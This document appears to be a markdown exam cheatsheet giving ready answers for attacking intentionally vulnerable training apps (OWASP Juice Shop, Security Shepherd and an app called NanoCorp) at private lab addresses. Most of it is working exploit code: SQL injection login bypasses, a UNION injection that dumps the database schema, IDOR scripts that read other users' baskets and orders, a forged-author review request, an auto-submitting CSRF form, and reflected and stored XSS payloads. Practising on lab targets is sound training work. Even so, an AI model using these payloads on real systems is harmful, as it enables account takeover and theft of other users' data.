# Exam Cheatsheet

---

## Juice Shop

### 1. Sensitive Data Exposure — Find Confidential File
Try accessing these URLs directly:
```
http://192.168.169.47:41427/ftp/
http://192.168.169.47:41427/ftp/acquisitions.md
```
Browse the `/ftp/` directory and download any confidential files there.

---

### 2. Security Misconfiguration — Metrics Endpoint
```
http://192.168.169.47:41427/metrics
```
Just visit that URL while unauthenticated (logged out).

---

### 3. SQL Injection — Admin Login Bypass
Go to login page, in the **email field** type:
```sql
' OR 1=1--
```
Password can be anything. This logs you in as admin.

Or try:
```
admin@juice-sh.op'--
```

---

### 4. IDOR — View Another User's Basket
Log in, then in console:
```javascript
fetch("/rest/basket/1", {
  headers: { "Authorization": "Bearer " + localStorage.getItem("token") }
})
.then(r => r.json())
.then(console.log);
```
Try basket IDs `1`, `2`, `3` until you see someone else's basket.

> Or resend GET requests with different Basket IDs in Network tab.

---

### 5. UNION SQL Injection — Extract DB Schema
In the **Console** type:
```sql
fetch("/rest/products/search?q=a')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--")
.then(r=>r.json()).then(console.log)
```

---

### 6. Broken Access Control — Post Review as Another User
In console while logged in:
```javascript
fetch("/rest/products/1/reviews", {
  method: "PUT",
  headers: {
    "Authorization": "Bearer " + localStorage.getItem("token"),
    "Content-Type": "application/json"
  },
  body: JSON.stringify({ message: "Great product!", author: "admin@juice-sh.op" })
})
.then(r => r.json())
.then(console.log);
```
> Or send a PUT/POST request with a different Author ID via Network tab.

---

## Security Shepherd

### 1. CSRF
The challenge gives you a key/token in the question. Put it in a hidden form field and submit:
```html
<html>
<body onload="document.forms[0].submit()">
<form action="http://192.168.169.113:53430/challenges/[CHALLENGE_ENDPOINT]" method="POST">
  <input type="hidden" name="csrf" value="[KEY_FROM_QUESTION]">
  <input type="hidden" name="searchTerm" value="[KEY_FROM_QUESTION]">
</form>
</body>
</html>
```
Check the challenge page for the exact key and endpoint URL.

---

### 2. SQL Injection
Try these in the input field:
```sql
" OR "1"="1
" OR 1=1--
" OR "1"="1"--
1" OR "1"="1
```

---

### 3. XSS Reflected
Try these in the search/input field:
```javascript
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

---

## NanoCorp

> **Note:** As per notifications, source code may change meaning while the payload is the same, the target location may differ. Keep trying and looking for it with hit and trial.

---

### 1. Reflected XSS — Restaurant Search Bar
Type directly in the search bar:
```javascript
<script>alert(1)</script>
```
If filtered, try:
```javascript
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
```

---

### 2. Stored XSS — Profile Name Field
Go to **Profile → Name field**, enter:
```javascript
<script>alert(1)</script>
```
If filtered:
```javascript
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```
Save it — when the name is rendered back to any user, the script executes.

---

### 3. IDOR — Orders
In the browser URL try:
```
/order/1
/order/2
/order/3
```
Or in console:
```javascript
fetch("/api/orders/1", {
  headers: { "Authorization": "Bearer " + localStorage.getItem("token") }
}).then(r => r.json()).then(console.log);

fetch("/api/orders/2", {
  headers: { "Authorization": "Bearer " + localStorage.getItem("token") }
}).then(r => r.json()).then(console.log);
```
Keep incrementing the ID until you hit another user's order.
